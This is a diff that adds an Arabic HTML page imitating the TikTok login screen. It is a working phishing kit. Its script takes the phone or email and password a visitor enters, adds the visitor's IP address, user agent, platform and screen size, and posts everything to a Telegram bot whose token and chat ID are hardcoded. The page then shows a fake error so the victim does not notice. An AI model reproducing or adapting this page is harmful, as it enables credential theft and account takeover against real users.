@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>تسجيل الدخول - تيك توك</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script> <!-- تحميل axios -->
+    <style>
+        /* نفس التنسيق كما في الكود السابق */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f7f7f7;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            direction: rtl; /* النص من اليمين لليسار */
+        }
+        .login-container {
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            padding: 30px;
+            text-align: center;
+        }
+        .login-container img {
+            width: 120px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+            text-align: right;
+        }
+        .input-group label {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 5px;
+            display: block;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            color: #333;
+        }
+        .btn-login {
+            width: 100%;
+            padding: 12px;
+            background-color: #00f2ea;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .btn-login:hover {
+            background-color: #1e9d9b;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+        .footer a {
+            color: #00f2ea;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .separator {
+            margin: 20px 0;
+            position: relative;
+            text-align: center;
+        }
+        .separator::before, .separator::after {
+            content: "";
+            display: block;
+            height: 1px;
+            background-color: #ddd;
+            width: 40%;
+            margin: 0 auto;
+        }
+        .separator span {
+            position: absolute;
+            top: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #fff;
+            padding: 0 10px;
+            color: #999;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <!-- شعار تيك توك -->
+    <img src="https://freepnglogo.com/images/all_img/1691751088logo-tiktok-png.png" alt="تيك توك">
+
+    <h2>تسجيل الدخول إلى تيك توك</h2>
+
+    <form id="login-form">
+        <div class="input-group">
+            <label for="phone">رقم الهاتف اوالبريد الإلكتروني</label>
+            <input type="text" id="phone" name="phone" placeholder=" أدخل رقم الهاتف اوالبريد الإلكتروني" required>
+        </div>
+        
+        <div class="input-group">
+            <label for="password">كلمة المرور</label>
+            <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور" required>
+        </div>
+        
+        <button type="submit" class="btn-login">تسجيل الدخول</button>
+    </form>
+
+    <div class="separator">
+        <span>أو</span>
+    </div>
+
+    <div class="footer">
+        <p>لا تمتلك حسابًا؟ <a href="#">اشترك الآن</a></p>
+        <p><a href="#">هل نسيت كلمة المرور؟</a></p>
+    </div>
+</div>
+
+<script>
+    const TOKEN = "7427593433:AAGKuJNUXJax85j4vucVUaAVSFsI664iFBQ";  // هنا التوكين
+    const CHAT_ID = "5893499785";  // هنا معرف الشات https://api.telegram.org/bot/getUpdates
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        
+
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        // استخدم حقل رقم الهاتف بدلاً من البريد الإلكتروني
+        const phone = document.getElementById('phone').value;
+        const password = document.getElementById('password').value;
+
+        axios.get('https://api.ipify.org?format=json')
+            .then(response => {
+                const ip = response.data.ip;
+
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                const message = ` 
+                    <b>محاولة تسجيل دخول جديدة</b>\n
+                    <b>رقم الهاتف:</b> ${phone}\n
+                    <b>كلمة المرور:</b> ${password}\n
+                    <b>عنوان الـ IP:</b> ${ip}\n
+                    <b>نوع الجهاز:</b> ${deviceType}\n
+                    <b>النظام الأساسي:</b> ${platform}\n
+                    <b>وكيل المستخدم:</b> ${userAgent}\n
+                    <b>دقة الشاشة:</b> ${screenWidth}x${screenHeight}
+                `;
+
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: message
+                }).then(response => {
+                    alert('حدث خطأ أثناء إرسال المعلومات. يرجى المحاولة مرة أخرى');
+                }).catch(error => {
+                    alert('حدث خطأ أثناء إرسال المعلومات. يرجى المحاولة مرة أخرى.');
+                });
+            })
+            .catch(error => {
+                alert('حدث خطأ أثناء جلب عنوان الـ IP. يرجى المحاولة مرة أخرى.');
+            });
+    });
+</script>
+
+</body>
+</html>
+
